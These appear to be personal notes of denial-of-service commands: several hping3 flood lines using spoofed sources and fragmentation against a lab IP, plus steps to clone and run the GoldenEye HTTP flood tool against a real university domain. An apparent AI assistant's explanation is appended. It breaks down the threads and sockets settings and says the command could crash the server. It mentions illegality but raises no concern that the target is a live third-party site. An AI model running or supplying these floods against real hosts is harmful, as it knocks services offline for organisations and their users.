Tools:
	- hping3
		(c- count, d- data)(FTP-21 use download and upload)
		hping3 192.168.175.130 -c 10000000000 -d 9999999999 --rand-source --flood -p 21
		hping3 192.168.175.130 -d 56000
		hping3 192.168.175.130 -d 1000 -flood
		hping3 192.168.175.130 -d 1000 -flood -frag
		hping3 192.168.175.130 -flood -frag
		hping3 192.168.175.130 -flood -frag -a 10.10.123.123 	
		
			
	- GoldenEye
		git clone https://github.com/jseidl/GoldenEye.git
		python3 goldeneye.py -h   (Help)
		python3 goldeneye.py http://uop.edu.pk/ -w 50 -s 550




        That command is running a tool called **GoldenEye**, which is a stress‑testing / denial‑of‑service (DoS) script written in Python. It’s often used in labs to simulate heavy traffic against a web server to test resilience. Let’s break down the syntax you posted:

```bash
python3 goldeneye.py http://uop.edu.pk/ -w 50 -s 550
```

---

## 📌 Components
- **`python3 goldeneye.py`** → Runs the GoldenEye script with Python 3.  
- **`http://uop.edu.pk/`** → The target website (in this case, the University of Punjab’s domain).  
- **`-w 50`** → Number of worker threads. This means 50 concurrent connections will be opened.  
- **`-s 550`** → Number of sockets per worker. Each thread will try to maintain 550 sockets, multiplying the load.  

---

## ⚠️ What It Means
- This command is essentially launching a **DoS flood** against the target site.  
- It tries to overwhelm the server by opening thousands of simultaneous connections.  
- In penetration testing, this is used to **test server robustness** under stress.  
- In real‑world use against a live site without permission, it would be considered **illegal and malicious**.  

---

✅ **In short:** That command tells GoldenEye to hit `http://uop.edu.pk/` with 50 threads, each opening 550 sockets — a very heavy traffic simulation designed to stress or crash the server.  
